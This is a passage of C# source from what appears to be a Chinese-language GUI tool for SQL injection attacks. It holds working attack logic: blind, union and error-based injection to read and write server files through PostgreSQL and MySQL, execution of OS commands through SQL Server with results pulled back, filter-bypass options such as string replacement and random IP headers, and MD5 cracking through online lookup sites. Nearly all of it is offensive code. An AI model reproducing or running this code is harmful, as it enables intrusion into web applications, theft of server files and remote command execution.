                    if (this.file_cbox_readWrite.SelectedIndex == 1)
                    {
                        //写文件
                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                        {

                            String[] lines = this.file_txt_result.Lines;
                            //创建表
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.createTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                            foreach (String line in lines)
                            {
                                //插入每一行数据
                                if (!String.IsNullOrEmpty(line))
                                {
                                    HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.getInsertLineValue(line), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                }
                                String payload = PostgreSQL.createTable;
                            }

                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.getWriteFilePayload(path), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                        }
                        else
                        {
                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
                        }

                    }
                    else if (this.file_cbox_readWrite.SelectedIndex == 2)
                    {
                        //读文件

                        String payload = PostgreSQL.getReadFilePayload(path);
                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        switch (config.injectType)
                        {
                            case InjectType.Blind:

                                try
                                {
                                    String count_payload = PostgreSQL.bool_data.Replace("{data}", PostgreSQL.file_content_Count);
                                    int count = 0;
                                    if (KeyType.Time.Equals(config.keyType))
                                    {
                                        count = getValueByStepUp(PostgreSQL.getBoolDataBySleep(PostgreSQL.file_content_Count, config.maxTime), 0, 50);
                                    }
                                    else
                                    {
                                        count = getValueByStepUp(count_payload, 0, 50);
                                    }

                                    for (int i = 0; i < count; i++)
                                    {
                                        data_payload = PostgreSQL.file_content_data.Replace("{index}", i + "");

                                        String payload_len_data = PostgreSQL.char_length.Replace("{data}", data_payload);
                                        String payload_len = PostgreSQL.bool_data.Replace("{data}", payload_len_data);
                                        int len = 0;
                                        if (KeyType.Time.Equals(config.keyType))
                                        {
                                            len = getValueByStepUp(PostgreSQL.getBoolDataBySleep(payload_len_data, config.maxTime), 0, 100);
                                        }
                                        else
                                        {
                                            len = getValueByStepUp(payload_len, 0, 100);
                                        }
                                        this.dataCount = len;
                                        ver_tmp = new String[len];
                                        //获取值
                                        for (int j = 1; j <= len; j++)
                                        {
                                            String dtmp_payload = PostgreSQL.bool_value.Replace("{data}", data_payload).Replace("{index}", j + "");
                                            stp.QueueWorkItem<string>(getFileContentBoolByPostgreSQL, dtmp_payload + "#" + j);
                                            stp.WaitFor(100);

                                        }
                                        stp.WaitForIdle();
                                        this.dataCount = len;
                                        this.file_txt_result.AppendText(HttpUtility.HtmlDecode(Tools.StringArrayToString(ver_tmp)) + "\r\n");
                                        this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取到文件第" + i + 1 + "行数据！", LogLevel.info);
                                    }
                                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，读取文件内容完成！", LogLevel.info);
                                }
                                catch (Exception e)
                                {
                                    this.txt_log.Invoke(new showLogDelegate(log), "读取文件内容发生异常：" + e.Message, LogLevel.error);
                                }
                                break;

                            case InjectType.Error:

                                String lineCount = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.file_content_Count));
                                this.dataCount = Tools.convertToInt(lineCount);
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，读到文件内容，共有" + Tools.convertToInt(lineCount) + "行数据！", LogLevel.success);
                                //注意下标从1开始
                                ver_tmp = new String[this.dataCount];
                                for (int i = 0; i < this.dataCount; i++)
                                {

                                    //按照一行的一列一列开始获取
                                    stp.QueueWorkItem<int>(getFileContentErrorByPostgreSQL, i);
                                    stp.WaitFor(100);
                                }
                                stp.WaitForIdle();
                                String result = Tools.convertToString(ver_tmp, true);
                                this.Invoke(new StringDelegate(file_txt_resultSetText), result);
                                this.txt_log.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + result.Length + "字节！", LogLevel.info);
                                break;
                            case InjectType.Union:
                                String elineCount = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.file_content_Count, "", "", ""));
                                this.dataCount = Tools.convertToInt(elineCount);
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，读到文件内容，共有" + Tools.convertToInt(elineCount) + "行数据！", LogLevel.success);
                                //注意下标从1开始
                                ver_tmp = new String[this.dataCount];
                                for (int i = 0; i < this.dataCount; i++)
                                {

                                    //按照一行的一列一列开始获取
                                    stp.QueueWorkItem<int>(getFileContentUnionByPostgreSQL, i);
                                    stp.WaitFor(100);
                                }
                                stp.WaitForIdle();
                                String eresult = Tools.convertToString(ver_tmp, true);
                                this.Invoke(new StringDelegate(file_txt_resultSetText), eresult);
                                this.txt_log.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + eresult.Length + "字节！", LogLevel.info);
                                break;

                        }
                        //删除临时表
                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.drop_table, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        this.txt_log.Invoke(new showLogDelegate(log), "删除临时表，完成！", LogLevel.info);

                    }

                    break;
            }

            this.file_btn_start.Enabled = true;
            status = 0;

        }
        /// <summary>
        /// SQLServer获取文件数据
        /// </summary>
        /// <param name="index"></param>
        public void getFileContentBoolBySQLServer(Object index)
        {
            try
            {
                //取值payload，替换对应下标值
                String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", index + "").Replace("{data}", SQLServer.file_content);
                //取unicode转换后的长度
                String unicode_data_len_payload = SQLServer.bool_length.Replace("{data}", unicode_data_payload);
                int unicode_data_len = 0;
                if (config.keyType.Equals(KeyType.Time))
                {
                    unicode_data_len = getValue(SQLServer.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
                }
                else
                {
                    unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                }

                //长度范围2-8支持大部分语言

                int m_index = 1;
                StringBuilder unicodes = new StringBuilder();

                String value = "";

                while (m_index <= unicode_data_len)
                {
                    //获取多字节
                    String substr_payload = SQLServer.bool_value.Replace("{data}", SQLServer.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString()));
                    //单个unicode值范围是0-9
                    int unicode = 0;
                    if (config.keyType.Equals(KeyType.Time))
                    {
                        unicode = getValue(SQLServer.getBoolDataBySleep(substr_payload, config.maxTime), 0, 9);
                    }
                    else
                    {
                        unicode = getValue(substr_payload, 0, 9);
                    }

                    unicodes.Append(unicode.ToString());
                    m_index++;
                }
                int rstr = int.Parse(unicodes.ToString());
                if (rstr <= 255)
                {
                    value += (char)rstr;
                }
                else
                {
                    value += Tools.unHexByUnicode(rstr, config.readFileEncoding);
                }
                ver_tmp[int.Parse(index.ToString()) - 1] = value;
                this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.StringArrayToString(ver_tmp));
            }
            catch (Exception e)
            {

                Tools.SysLog("获取SQLServer读到的文件内容发生错误！" + e.Message);
            }
        }

        /// <summary>
        /// PostgreSQL获取文件数据
        /// </summary>
        /// <param name="index"></param>
        public void getFileContentBoolByPostgreSQL(Object param)
        {
            try
            {
                String[] ps = param.ToString().Split('#');
                int index = int.Parse(ps[1].ToString());
                String tmp_va_payload = ps[0];
                //取unicode转换后的长度
                String unicode_data_len_payload = PostgreSQL.bool_length.Replace("{data}", tmp_va_payload); ;
                int unicode_data_len = 0;
                if (config.keyType.Equals(KeyType.Time))
                {
                    unicode_data_len = getValue(PostgreSQL.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
                }
                else
                {
                    unicode_data_len = getValue(PostgreSQL.bool_data.Replace("{data}", unicode_data_len_payload), 1, 8);
                }

                //长度范围2-8支持大部分语言

                int m_index = 1;
                StringBuilder unicodes = new StringBuilder();

                String value = "";

                while (m_index <= unicode_data_len)
                {
                    //获取多字节
                    String substr_payload = PostgreSQL.bool_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index.ToString());
                    //单个unicode值范围是0-9
                    int unicode = 0;
                    if (config.keyType.Equals(KeyType.Time))
                    {
                        unicode = getValue(PostgreSQL.getBoolDataBySleep(substr_payload, config.maxTime), 48, 57);
                    }
                    else
                    {
                        unicode = getValue(PostgreSQL.bool_data.Replace("{data}", substr_payload), 48, 57);
                    }
                    char ascii = (char)unicode;
                    unicodes.Append(ascii);
                    m_index++;

                }
                int eunicode = Tools.convertToInt(unicodes.ToString());
                if (eunicode <= 255)
                {
                    value += (char)eunicode;
                }
                else
                {
                    value += Tools.unHexByUnicode(eunicode, config.readFileEncoding);
                }
                ver_tmp[int.Parse(index.ToString()) - 1] = value;
                m_index++;

            }
            catch (Exception e)
            {

                Tools.SysLog("获取读到的文件内容发生错误！" + e.Message);
            }
        }


        /// <summary>
        /// 获取数据PostgreSQL，error方式,这个长度有一定限制
        /// </summary>
        /// <param name="index">参数第几行，0开始</param>
        public void getFileContentErrorByPostgreSQL(int index)
        {
            try
            {
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.file_content_data.Replace("{index}", index + "")));
                result = HttpUtility.HtmlDecode(result);
                ver_tmp[index] = result;
                this.txt_log.Invoke(new showLogDelegate(log), "读取到文件第" + index + "行内容，长度" + result.Length + "！", LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取数据PostgreSQL，error方式,这个长度有一定限制
        /// </summary>
        /// <param name="index">参数第几行，0开始</param>
        public void getFileContentUnionByPostgreSQL(int index)
        {
            try
            {
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.file_content_data, "", "", index + ""));
                result = HttpUtility.HtmlDecode(result);
                ver_tmp[index] = result;
                this.txt_log.Invoke(new showLogDelegate(log), "读取到文件第" + index + "行内容，长度" + result.Length + "！", LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
        }

        public void readOrWriteFileByMySQLByHexAscii(Object param)
        {
            String[] ps = param.ToString().Split('#');
            int index = int.Parse(ps[1].ToString());
            String tmp_va_payload = MySQL.ver_value.Replace("{data}", ps[0]).Replace("{index}", (index + 1) + "");

            int ascii = 0;
            //延时注入
            if (config.keyType.Equals(KeyType.Time))
            {
                ascii = getValue(MySQL.getBoolCountBySleep(tmp_va_payload, config.maxTime), 48, 90);
            }
            else
            {
                ascii = getValue(tmp_va_payload, 48, 90);
            }
            //数字加大写字母的ascii码
            ver_tmp[index] = ((char)ascii).ToString();
            String value = Tools.unHex(Tools.convertToString(ver_tmp), config.readFileEncoding);
            this.Invoke(new StringDelegate(file_txt_resultSetText), value);
            Interlocked.Increment(ref this.currentDataCount);
        }


        public void execCMDBySQLServerByUnicode(Object param)
        {

            String[] ps = param.ToString().Split('#');
            int index = int.Parse(ps[1]);

            int len = 0;
            if (KeyType.Time.Equals(config.keyType))
            {
                len = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", ps[0]), config.maxTime), 0, 8);
            }
            else
            {
                len = getValue(SQLServer.bool_length.Replace("{data}", ps[0]), 0, 8);
            }


            int cindex = 1;
            String temUnicode = "";
            while (cindex <= len)
            {
                String tmp_payload = SQLServer.bool_value.Replace("{data}", SQLServer.substr.Replace("{data}", ps[0]).Replace("{index}", cindex + ""));
                //数字加大写字母的ascii码
                int ascii = 0;
                if (KeyType.Time.Equals(config.keyType))
                {
                    ascii = getValue(SQLServer.getBoolDataBySleep(tmp_payload, config.maxTime), 0, 9);
                }
                else
                {
                    ascii = getValue(tmp_payload, 0, 9);
                }

                temUnicode += ascii.ToString();
                cindex++;
            }
            int unicode = Tools.convertToInt(temUnicode);

            ver_tmp[index - 1] = Tools.unHexByUnicode(unicode, "UTF-8");
            this.txt_log.Invoke(new showLogDelegate(log), "获取到CMD执行结果--" + ver_tmp[index - 1], LogLevel.info);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void execCMDBySQLServer()
        {
            try
            {
                if (Thread.CurrentThread.Name == null)
                {
                    Thread.CurrentThread.Name = "CmdThread-";
                }
                this.dataCount = 0;
                String cmd = this.cmd_txt_cmd.Text;
                String cmd_16 = Tools.strToHex(cmd, "GB2312");
                //执行cmd
                String cmd_data_payload = SQLServer.createTableAndExecCmd.Replace("{cmd}", cmd_16);
                //修正payload
                int ssindex = config.request.IndexOf("<Encode>");
                int seindex = config.request.IndexOf("</Encode>");
                if (ssindex == -1 || seindex == -1)
                {
                    MessageBox.Show("大侠，请在注入中心，进行编码标记，否则无法执行命令！");
                    return;
                }
                //修正payload
                //String cmdrequest = Regex.Replace(config.request, "\\<Encode\\>(.*?)\\<\\/Encode\\>", "<Encode>#inject#</Encode>");
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cmd_data_payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，CMD命令执行完成，正在等待获取执行结果！", LogLevel.info);
                if (config.showCmdResult)
                {
                    switch (config.injectType)
                    {

                        case InjectType.Blind:
                            try
                            {
                                if (String.IsNullOrEmpty(config.key))
                                {

                                    MessageBox.Show("大侠，请在注入中心，配置Bool盲注的判断值！");
                                    return;
                                }
                                String count_payload = SQLServer.bool_value.Replace("{data}", SQLServer.cmdDataCount);
                                int count = 0;
                                if (KeyType.Time.Equals(config.keyType))
                                {
                                    count = getValueByStepUp(SQLServer.getBoolDataBySleep(count_payload, config.maxTime), 0, 50);
                                }
                                else
                                {
                                    count = getValueByStepUp(count_payload, 0, 50);
                                }

                                for (int i = 1; i <= count; i++)
                                {
                                    String data_payload = SQLServer.cmdData.Replace("{index}", i + "");
                                    String payload_len = SQLServer.bool_length.Replace("{data}", data_payload);
                                    int len = 0;
                                    if (KeyType.Time.Equals(config.keyType))
                                    {
                                        len = getValueByStepUp(SQLServer.getBoolDataBySleep(payload_len, config.maxTime), 0, 100);
                                    }
                                    else
                                    {
                                        len = getValueByStepUp(payload_len, 0, 100);
                                    }
                                    this.dataCount = len;
                                    ver_tmp = new String[len];
                                    //获取值
                                    for (int j = 1; j <= len; j++)
                                    {
                                        String dtmp_payload = PostgreSQL.bool_value.Replace("{data}", data_payload).Replace("{index}", j + "");
                                        stp.QueueWorkItem<string>(execCMDBySQLServerByUnicode, dtmp_payload + "#" + j);
                                        stp.WaitFor(100);

                                    }
                                    stp.WaitForIdle();
                                    this.dataCount = len;
                                    this.cmd_txt_result.AppendText(HttpUtility.HtmlDecode(Tools.StringArrayToString(ver_tmp)) + "\r\n");
                                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取到执行CMD命令第" + i + "行数据！", LogLevel.info);
                                }
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取CMD执行结果完成！", LogLevel.info);
                            }
                            catch (Exception e)
                            {
                                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
                            }
                            break;
                        case InjectType.Union:
                            try
                            {
                                //检查配置
                                if (config.columnsCount <= 0)
                                {

                                    MessageBox.Show("大侠，请在注入中心，配置Union注入的列数！");
                                    return;
                                }

                                String data_count = getOneDataByUnionOrError(SQLServer.getUnionDataValueByCMD(config.columnsCount, config.showColumn, config.unionFill, SQLServer.cmdDataCount));

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，CMD执行后CMD表有" + Tools.convertToInt(data_count) + "行数据，请稍候，正在获取...", LogLevel.info);

                                int count = Tools.convertToInt(data_count);
                                this.dataCount = count;
                                //下标从1开始
                                for (int i = 1; i <= count; i++)
                                {
                                    String payload = SQLServer.cmdData.Replace("{index}", i.ToString());
                                    String result = getOneDataByUnionOrError(SQLServer.getUnionDataValueByCMD(config.columnsCount, config.showColumn, config.unionFill, payload));
                                    this.cmd_txt_result.AppendText(HttpUtility.HtmlDecode(result) + "\r\n");
                                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取到执行CMD命令第" + i + "行数据！", LogLevel.info);
                                    this.currentDataCount = i;
                                }
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取CMD执行结果完成！", LogLevel.info);


                            }
                            catch (Exception e)
                            {
                                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
                            }
                            break;
                        case InjectType.Error:
                            try
                            {

                                String payload_len = SQLServer.bool_length.Replace("{data}", SQLServer.cmdData);
                                String data_count = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.cmdDataCount));

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，正在获取CMD命令执行结果！", LogLevel.info);
                                int count = Tools.convertToInt(data_count);
                                this.dataCount = count;
                                //下标从1开始
                                for (int i = 1; i <= count; i++)
                                {
                                    String payload = SQLServer.cmdData.Replace("{index}", i.ToString());
                                    String result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", payload));
                                    this.cmd_txt_result.AppendText(HttpUtility.HtmlDecode(result) + "\r\n");
                                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取到执行CMD命令第" + i + "行数据！", LogLevel.info);
                                    this.currentDataCount = i;
                                }
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取CMD执行结果完成！", LogLevel.info);

                            }
                            catch (Exception e)
                            {

                                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
                            }
                            break;
                    }
                }
                //删除表

                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                this.txt_log.Invoke(new showLogDelegate(log), "清除执行命令时创建的临时表完成！", LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "执行命令获取结果发生异常：" + e.Message, LogLevel.error);
            }
            this.cmd_btn_start.Enabled = true;
            status = 0;
        }


        private void file_btn_start_Click(object sender, EventArgs e)
        {
            if (status == 0)
            {
                if (this.file_cbox_readWrite.SelectedIndex > 0)
                {
                    if (String.IsNullOrEmpty(this.file_txt_filePath.Text))
                    {

                        MessageBox.Show("请填写读写文件的磁盘路径！");
                        return;
                    }
                    if (stp.InUseThreads > 0)
                    {
                        MessageBox.Show("请稍候还有后台线程正在运行！");
                        return;
                    }
                    if (!checkConfig())
                    {
                        return;
                    }
                    if (!isSetInjectPoint())
                    {
                        return;
                    }
                    status = 1;
                    this.file_btn_start.Enabled = false;
                    this.currentThread = new Thread(readOrWriteFile);
                    this.currentThread.Start();
                }
                else
                {
                    MessageBox.Show("抱歉，没有选择读写文件方式或此数据库不支持文件读写！");
                }
            }
            else
            {

                StopThread();
                this.file_btn_start.Enabled = true;
            }

        }

        private void cmd_btn_start_Click(object sender, EventArgs e)
        {
            if (status == 0)
            {
                if (config.dbType.Equals(DBType.SQLServer))
                {
                    if (String.IsNullOrEmpty(this.cmd_txt_cmd.Text))
                    {

                        MessageBox.Show("请输入执行的命令！");
                        return;
                    }
                    if (stp.InUseThreads > 0)
                    {
                        MessageBox.Show("请稍候还有后台线程正在运行！");
                        return;
                    }

                    status = 1;
                    this.cmd_btn_start.Enabled = false;
                    this.cmd_txt_result.Clear();
                    this.currentThread = new Thread(execCMDBySQLServer);
                    this.currentThread.Start();
                }
                else
                {
                    MessageBox.Show("抱歉，此功能目前只支持SQLServer数据库，并且账户拥有dba权限！");
                }
            }
            else
            {
                StopThread();
            }
        }

        private void cmd_chk_showCmdResult_CheckedChanged(object sender, EventArgs e)
        {
            config.showCmdResult = this.cmd_chk_showCmdResult.Checked;
        }

        private void file_txt_result_TextChanged(object sender, EventArgs e)
        {
            this.file_txt_result.SelectionStart = this.file_txt_result.Text.Length;
            this.file_txt_result.SelectionLength = 0;
            this.file_txt_result.ScrollToCaret();
        }

        private void cmd_txt_result_TextChanged(object sender, EventArgs e)
        {
            this.file_txt_result.SelectionStart = this.file_txt_result.Text.Length;
            this.file_txt_result.SelectionLength = 0;
            this.file_txt_result.ScrollToCaret();
        }

        private void bypass_btn_addReplaceStr_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(this.bypass_txt_replace.Text))
            {

                MessageBox.Show("大侠，请输入需要替换的字符！");
                return;
            }

            if (this.bypass_txt_replace.Text.Equals(this.bypass_txt_replaceTo.Text))
            {

                MessageBox.Show("大侠，两个字符一样的，还需要替换什么，你这是在忽悠我吗！");
                return;
            }

            if (!replaceList.ContainsKey(this.bypass_txt_replace.Text))
            {
                ListViewItem lvi = new ListViewItem(this.bypass_txt_replace.Text);
                lvi.SubItems.Add(this.bypass_txt_replaceTo.Text);
                lvi.Name = this.bypass_txt_replaceTo.Text;
                this.bypass_lvw_replaceString.Items.Add(lvi);

                replaceList.Add(this.bypass_txt_replace.Text, this.bypass_txt_replaceTo.Text);
                config.replaceStrs += (this.bypass_txt_replace.Text + "\t" + this.bypass_txt_replaceTo.Text + "\n");
            }
            else
            {
                MessageBox.Show("大侠，替换字符" + this.bypass_txt_replace.Text + "已经在列表了！");
            }




        }

        private void bypass_chk_inculdeStr_CheckedChanged(object sender, EventArgs e)
        {
            config.inculdeStr = this.bypass_chk_inculdeStr.Checked;
        }

        private void file_cbox_readWrite_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if ("加载获取IIS虚拟网站信息VBS".Equals(this.file_cbox_readWrite.Text))
                {

                    //加载vbs脚本
                    this.file_txt_filePath.Text = "c:/test.vbs";
                    this.file_txt_result.Text = FileTool.readFileToString("config/GetIISWebInfo.vbs");
                    MessageBox.Show("加载成功，大侠，请选择对应的写文件方法写入VBS！");
                }
            }
            catch (Exception ee)
            {
                Tools.SysLog("读取config/GetIISWebInfo.vbs发生错误！异常信息：" + ee.Message);
                MessageBox.Show("加载config/GetIISWebInfo.vbs发生错误！");
            }
        }
        //验证key是否正确
        private void injectConfig_btn_checkKey_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(checkTheKey);
            this.injectConfig_btn_checkKey.Enabled = false;
            t.Start();
        }

        public void checkTheKey()
        {

            if (checkConfig())
            {
                if (isSetInjectPoint())
                {

                    bool truep = findKeyInBody(Comm.truePayload);
                    bool falsep = findKeyInBody(Comm.falsePayload);

                    bool isok = false;

                    if (!config.reverseKey)
                    {
                        if (truep && !falsep)
                        {
                            isok = true;
                        }
                    }
                    else
                    {
                        if ((!truep) && falsep)
                        {
                            isok = true;
                        }
                    }

                    if (isok)
                    {
                        MessageBox.Show("判断值设置正确！");
                    }
                    else
                    {

                        MessageBox.Show("此判断值设置错误，无法通过此判断值获取数据！请查看HTTP发包记录是否存在乱码，检查编码设置是否正确；可能此判断值同时在真假条件上出现，请更换判断值！");
                    }
                }
            }
            this.injectConfig_btn_checkKey.Enabled = true;
        }

        private void bypass_cbox_sendHTTPSleepTime_TextChanged(object sender, EventArgs e)
        {
            config.sendHTTPSleepTime = Tools.convertToInt(this.bypass_cbox_sendHTTPSleepTime.Text);
        }

        private void bypass_cbox_randIPToHeader_TextChanged(object sender, EventArgs e)
        {
            config.randIPToHeader = this.bypass_cbox_randIPToHeader.Text;
        }

        private void encode_cbox_encode_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                String encode = this.encode_txt_input.Text;
                if (this.encode_cbox_encode.SelectedIndex != 0)
                {

                    if (String.IsNullOrEmpty(encode))
                    {
                        MessageBox.Show("请输入要编码的字符！");
                        this.encode_txt_input.Focus();
                    }
                }

                switch (this.encode_cbox_encode.SelectedIndex)
                {
                    case 1:
                        this.encode_txt_result.Text = System.Web.HttpUtility.UrlEncode(encode);
                        break;
                    case 2:
                        this.encode_txt_result.Text = Convert.ToBase64String(Encoding.UTF8.GetBytes(encode));
                        break;
                    case 3:
                        this.encode_txt_result.Text = Tools.stringToAscii(encode);
                        break;
                    case 4:
                        this.encode_txt_result.Text = Tools.strToHex(encode, "UTF-8");
                        break;
                    case 5:
                        md5();
                        break;
                    case 6:
                        this.encode_txt_result.Text = Tools.strToChrOrChar(encode, "chr", " ", "UTF-8");
                        break;
                    case 7:
                        this.encode_txt_result.Text = Tools.strToChrOrChar(encode, "char", " ", "UTF-8");
                        break;

                }
            }
            catch (Exception ep)
            {

                log("编码发生异常！" + ep.Message, LogLevel.error);

            }
        }

        private void encode_cbox_decode_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                String decode = this.encode_txt_input.Text;
                if (this.encode_cbox_decode.SelectedIndex != 0)
                {

                    if (String.IsNullOrEmpty(decode))
                    {
                        MessageBox.Show("请输入要解码的字符！");
                        this.encode_txt_result.Focus();
                    }
                }

                switch (this.encode_cbox_decode.SelectedIndex)
                {
                    case 1:
                        this.encode_txt_result.Text = System.Web.HttpUtility.UrlDecode(decode);
                        break;
                    case 2:
                        this.encode_txt_result.Text = Encoding.UTF8.GetString(Convert.FromBase64String(decode));
                        break;
                    case 3:
                        MessageBox.Show("多个ascii需使用空格隔开！");
                        this.encode_txt_result.Text = Tools.asciiToString(decode);
                        break;
                    case 4:
                        this.encode_txt_result.Text = Tools.unHex(decode, "UTF-8");
                        break;
                    case 5:
                        log("----------------正在进行在线MD5解密----------------", LogLevel.info);
                        log("----------------正在查找www.cmd5.com---------------", LogLevel.info);
                        this.encode_txt_result.Text = "";
                        this.encode_txt_result.Text += "www.cmd5.com查询结果：" + OnlineMD5.decodeMD5_cmd5(this.encode_txt_input.Text) + "\r\n";
                        log("----------------正在查找www.md5.com.cn--------------", LogLevel.info);
                        this.encode_txt_result.Text += "www.md5.com.cn查询结果：" + OnlineMD5.decodeMD5_md5_com_cn(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.xmd5.org----------------", LogLevel.info);
                        this.encode_txt_result.Text += "www.xmd5.org查询结果：" + OnlineMD5.decodeMD5_xmd5_org(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.somd5.com---------------", LogLevel.info);
                        this.encode_txt_result.Text += "www.somd5.com查询结果：" + OnlineMD5.decodeMD5_somd5_com(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.md5.cc------------------", LogLevel.info);
                        this.encode_txt_result.Text += "www.md5.cc查询结果：" + OnlineMD5.decodeMD5_md5_cc(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.pmd5.com------------------", LogLevel.info);
                        this.encode_txt_result.Text += "www.pmd5.cm查询结果：" + OnlineMD5.decodeMD5_pmd5_com(this.encode_txt_input.Text);
                        break;
                    case 6:
                        this.encode_txt_result.Text = Tools.chrOrCharToStr(decode, "chr", "UTF-8");
                        break;
                    case 7:
                        this.encode_txt_result.Text = Tools.chrOrCharToStr(decode, "char", "UTF-8");
                        break;

                }
            }
            catch (Exception ep)
            {

                log("解码发生异常！" + ep.Message, LogLevel.error);
            }
        }
        public void checkTheKey(ServerInfo trueServer, ServerInfo falseServer, ServerInfo oldServer)
        {

            //判断关键字,body中的词
            //记录trueServer状态码，后面判断，降低误报
            config.injectHTTPCode = trueServer.code;
            String key = Tools.findKeyByStr(trueServer.body, falseServer.body, oldServer.body);
            this.chk_inject_reverseKey.Checked = false;
            //如果为空反过来查找
            if (String.IsNullOrEmpty(key))
            {
                this.txt_log.Invoke(new showLogDelegate(log), "Body响应内容中正向查找未发现盲注判断值！", LogLevel.info);
                this.chk_inject_reverseKey.Checked = true;
                key = Tools.findKeyByStr(falseServer.body, trueServer.body, oldServer.body);
                if (String.IsNullOrEmpty(key))
                {
                    this.txt_log.Invoke(new showLogDelegate(log), "Body响应内容中反向查找未发现盲注判断值！", LogLevel.info);
                    this.chk_inject_reverseKey.Checked = false;
                }
            }
            if (!String.IsNullOrEmpty(key))
            {
                this.cbox_inject_type.SelectedIndex = 0;
                this.txt_inject_key.Text = key;
                this.txt_log.Invoke(new showLogDelegate(log), "发现盲注判断值！" + key, LogLevel.success);
                return;
            }

            //状态码判断
            int code = Tools.findKeyByCode(trueServer.code, falseServer.code);
            if (code == 0)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "响应状态码不能作为盲注判断条件！", LogLevel.info);

            }
            else
            {
                this.cbox_inject_type.SelectedIndex = 1;
                this.txt_inject_key.Text = key;
                this.txt_log.Invoke(new showLogDelegate(log), "响应状态码可以作为盲注判断条件！", LogLevel.info);
                return;
            }

            //时间判断

            if (trueServer.runTime < config.maxTime && falseServer.runTime < config.maxTime)
            {
                this.cbox_inject_type.SelectedIndex = 2;
                this.txt_inject_key.Text = config.maxTime.ToString();
                this.txt_log.Invoke(new showLogDelegate(log), "逻辑为真的响应时间可以作为盲注判断条件！", LogLevel.info);
                return;
            }
            if (falseServer.runTime < config.maxTime && trueServer.runTime < config.maxTime)
            {
                this.cbox_inject_type.SelectedIndex = 2;
                this.txt_inject_key.Text = config.maxTime.ToString();
                this.chk_inject_reverseKey.Checked = true;
                this.txt_log.Invoke(new showLogDelegate(log), "逻辑为假的响应时间可以作为盲注判断条件！", LogLevel.info);
                return;
            }
